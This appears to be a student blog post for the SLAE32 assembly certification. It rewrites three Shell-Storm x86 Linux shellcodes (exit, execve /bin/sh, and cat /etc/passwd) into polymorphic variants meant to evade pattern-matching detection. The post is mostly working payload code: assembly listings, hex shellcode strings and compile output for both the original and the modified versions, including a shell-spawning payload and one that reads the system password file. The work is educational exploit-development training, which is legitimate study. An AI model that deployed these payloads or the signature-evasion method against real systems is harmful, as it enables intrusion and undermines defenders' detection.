---
title: SLAE32 - Assignment#6 [Polymorphic Shellcode]
author: bigb0ss
date: 2021-04-26 23:53:00 +0800
categories: [SLAE32, Assignment_6_Polymorphic]
tags: [slae32, assembly, x86, Polymorphic Shellcode]
image: /assets/img/post/slae32/slae32.png
---

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#6 Github](https://github.com/bigb0sss/SLAE32)

# Assignement #6 
* Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
* The polymorphic versions cannot be larger 150% of the existing shellcode
* Bonus points for making it shorter in length than original

# What is Polymorphism?
The polymorphism means the ability of an object to take on many forms. In computer science, the term polymorphism also means the ability of differnt objects/codes to respond in a unique way to the same functionality. 

# Shellcode Selection
I will use the following shellcode from the Shell-Storm to demonstrate the polymorphic shellcode. 
* sys_exit(0) - http://shell-storm.org/shellcode/files/shellcode-623.php
* /bin/sh - http://shell-storm.org/shellcode/files/shellcode-752.php
* /bin/cat /etc/passwd - http://shell-storm.org/shellcode/files/shellcode-571.php

# 1) sys_exit(0)
The original shellcode from the Shell-Storm is as following:

```c
/*
Name   : 8 bytes sys_exit(0) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

char *bye=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		((void (*)(void)) bye)();
		return 0;
}
```

The assembly for the original shellcode (`sys_exit_original.nasm`) in Intel is: 

```nasm
global _start

section .text

_start:

	xor eax, eax    ; Zeroing out EAX
	mov al, 0x1     ; Moving 1 to A low in EAX = #define __NR_exit 1 in unistd_32.h --> void exit(int status);
	xor ebx, ebx    ; Zeroing out EBX ==> int status = 0x0
	int 0x80        ; Executing exit(0)
```

Modified assembly (`sys_exit_modified.nasm`) is:

```nasm
global _start

section .text

_start:
        xor eax, eax    ; Zeroing out EAX
        inc eax         ; Increase EAX by 0x1 = #define __NR_exit 1
        xor ebx, ebx    ; Zeroing out EBX ==> int status = 0x0
        int 0x80        ; Executing exit(0)
```

And let's compile the both `.nasm` files with [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py) and compare the bytes:

```bash
# python compilerX86.py -f sys_exit_original

[+] Assemble: sys_exit_original.nasm
[+] Linking: sys_exit_original.o
[+] Shellcode: "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
[+] ASM code: 0x31,0xc0,0xb0,0x01,0x31,0xdb,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!

# python compilerX86.py -f sys_exit_modified

[+] Assemble: sys_exit.nasm
[+] Linking: sys_exit.o
[+] Shellcode: "\x31\xc0\x40\x31\xdb\xcd\x80"
[+] ASM code: 0x31,0xc0,0x40,0x31,0xdb,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

```bash
# echo "[INFO] Original:" && echo -ne "\x31\xc0\xb0\x01\x31\xdb\xcd\x80" | wc -c
[INFO] Original:
8

# echo "[INFO] Modified:" && echo -ne "\x31\xc0\x40\x31\xdb\xcd\x80" | wc -c
[INFO] Modified:
7
```

It resulted in 12% decrease in the polymorphic shellcode.  

# 2) /bin/sh
The original shellcode from the Shell-Storm is as following:

```c
/*
 Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
 Date     : 10 Feb 2011
 Author   : kernel_panik
 Thanks   : cOokie, agix, antrhacks
*/

/*
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 mov al, 11
 int 0x80
*/

#include <stdio.h>
#include <string.h>

char code[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
 printf ("Shellcode length : %d bytes\n", strlen (code));
 int(*f)()=(int(*)())code;
 f();
}
```

The assembly for the original shellcode (`bin_sh_original.nasm`) in Intel is: 

```nasm
global _start

section .text

_start:
 	xor ecx, ecx
 	mul ecx
 	push ecx
 	push 0x68732f2f   ;; hs//
 	push 0x6e69622f   ;; nib/
 	mov ebx, esp
 	mov al, 11        ; execve() = #define __NR_execve 11
 	int 0x80
```

Modified assembly (`bin_sh_modified.nasm`) is:

```nasm
global _start

section .text

_start:
    xor eax, eax        ; Zero out EAX
    xor ebx, ebx        ; Zero out EBX
    xor ecx, ecx        ; Zero out ECX

    mov esi, 0x68732f2e
    inc esi
    mov edi, 0x6e69622e
    inc edi

    push esi
    push edi

    mov ebx, esp
    mov al, 0xb         ; execve() = #define __NR_execve 11
    int 0x80
```

And let's compile the both `.nasm` files with [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py) and compare the bytes:

```bash
# python ../compilerX86.py -f bin_sh_original
 
[+] Assemble: bin_sh_original.nasm
[+] Linking: bin_sh_original.o
[+] Shellcode: "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
[+] ASM code: 0x31,0xc9,0xf7,0xe1,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0xb0,0x0b,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!

# python ../compilerX86.py -f bin_sh_modified
 
[+] Assemble: bin_sh_modified.nasm
[+] Linking: bin_sh_modified.o
[+] Shellcode: "\x31\xc0\x31\xdb\x31\xc9\xbe\x2e\x2f\x73\x68\x46\xbf\x2e\x62\x69\x6e\x47\x56\x57\x89\xe3\xb0\x0b\xcd\x80"
[+] ASM code: 0x31,0xc0,0x31,0xdb,0x31,0xc9,0xbe,0x2e,0x2f,0x73,0x68,0x46,0xbf,0x2e,0x62,0x69,0x6e,0x47,0x56,0x57,0x89,0xe3,0xb0,0x0b,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

```bash
# echo "[INFO] Original:" && echo -ne "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" | wc -c
[INFO] Original:
21

# echo "[INFO] Modified:" && echo -ne "\x31\xc0\x31\xdb\x31\xc9\xbe\x2e\x2f\x73\x68\x46\xbf\x2e\x62\x69\x6e\x47\x56\x57\x89\xe3\xb0\x0b\xcd\x80" | wc -c
[INFO] Modified:
26
```

It resulted in 24% increase in the polymorphic shellcode. 

# 3) /bin/cat /etc/passwd
The original shellcode from the Shell-Storm is as following:

```c
#include <stdio.h>
 
const char shellcode[]="\x31\xc0" // xorl %eax,%eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x63\x61\x74" // push dword 0x7461632f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69622f
"\x89\xe3" // mov ebx,esp
"\x52" // push edx
"\x68\x73\x73\x77\x64" // pu sh dword 0x64777373
"\x68\x2f\x2f\x70\x61" // push dword 0x61702f2f
"\x68\x2f\x65\x74\x63" // push dword 0x6374652f
"\x89\xe1" // mov ecx,esp
"\xb0\x0b" // mov $0xb,%al
"\x52" // push edx
"\x51" // push ecx
"\x53" // push ebx
"\x89\xe1" // mov ecx,esp
"\xcd\x80" ; // int 80h
 
int main()
{
(*(void (*)()) shellcode)();
 
return 0;
}
 
 
/*
shellcode[]=	"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64" 
		"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
*/
```

The assembly for the original shellcode (`etc_passwd_original.nasm`) in Intel is:

```nasm
global _start

section .text

_start:
        xor eax, eax
        cdq
        push edx
        push dword 0x7461632f   ; tac/
        push dword 0x6e69622f   ; nib/
        mov ebx, esp
        push edx
        push dword 0x64777373   ; dwss
        push dword 0x61702f2f   ; ap//
        push dword 0x6374652f   ; cte/
        mov ecx, esp
        mov al, 0xb
        push edx
        push ecx
        push ebx
        mov ecx, esp
        int 0x80
```

Modified assembly (`etc_passwd_modified.nasm`) is:

```nasm
global _start

section .text

_start:
        xor ebx, ebx    ; Zero out EBX
        mul ebx         ; Zero out EAX and EDX
        push edx        ; Push EDX (0x0) onto the stack => Null terminator

        mov esi, 0x7461632e
        inc esi
        push esi
        mov esi, 0x6e69622e
        inc esi
        push esi
        mov ebx, esp    ; EBX = /bin/cat
        push edx        ; Null terminator

        mov esi, 0x64777372
        inc esi
        push esi
        mov esi, 0x61702f2e
        inc esi
        push esi
        mov esi, 0x6374652e
        inc esi
        push esi
        mov ecx, esp    ; ECX = /etc/passwd
        mov al, 11      ; EAX = execve()

        push edx        ; Null terminator (0x0)
        push ecx        ; /etc/passwd
        push ebx        ; /bin/cat
        mov ecx, esp    ; ['/bin/cat', '/etc/passwd', '0x0']
        int 0x80        ; Execute execve()
```

And let's compile the both `.nasm` files with [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py) and compare the bytes:

```bash
# python ../compilerX86.py -f etc_passwd_original

[+] Assemble: etc_passwd_original.nasm
[+] Linking: etc_passwd_original.o
[+] Shellcode: "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
[+] ASM code: 0x31,0xc0,0x99,0x52,0x68,0x2f,0x63,0x61,0x74,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0x68,0x73,0x73,0x77,0x64,0x68,0x2f,0x2f,0x70,0x61,0x68,0x2f,0x65,0x74,0x63,0x89,0xe1,0xb0,0x0b,0x52,0x51,0x53,0x89,0xe1,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!

# python ../compilerX86.py -f etc_passwd_modified

[+] Assemble: etc_passwd_modified.nasm
[+] Linking: etc_passwd_modified.o
[+] Shellcode: "\x31\xdb\xf7\xe3\x52\xbe\x2e\x63\x61\x74\x46\x56\xbe\x2e\x62\x69\x6e\x46\x56\x89\xe3\x52\xbe\x72\x73\x77\x64\x46\x56\xbe\x2e\x2f\x70\x61\x46\x56\xbe\x2e\x65\x74\x63\x46\x56\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
[+] ASM code: 0x31,0xdb,0xf7,0xe3,0x52,0xbe,0x2e,0x63,0x61,0x74,0x46,0x56,0xbe,0x2e,0x62,0x69,0x6e,0x46,0x56,0x89,0xe3,0x52,0xbe,0x72,0x73,0x77,0x64,0x46,0x56,0xbe,0x2e,0x2f,0x70,0x61,0x46,0x56,0xbe,0x2e,0x65,0x74,0x63,0x46,0x56,0x89,0xe1,0xb0,0x0b,0x52,0x51,0x53,0x89,0xe1,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!

```

```bash
# echo "[INFO] Original:" && echo -ne "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | wc -c
[INFO] Original:
43

# echo "[INFO] Modified:" && echo -ne "\x31\xdb\xf7\xe3\x52\xbe\x2e\x63\x61\x74\x46\x56\xbe\x2e\x62\x69\x6e\x46\x56\x89\xe3\x52\xbe\x72\x73\x77\x64\x46\x56\xbe\x2e\x2f\x70\x61\x46\x56\xbe\x2e\x65\x74\x63\x46\x56\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | wc -c
[INFO] Modified:
54
```

It resulted in 26% increase in the polymorphic shellcode. 


<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#6 Github](https://github.com/bigb0sss/SLAE32)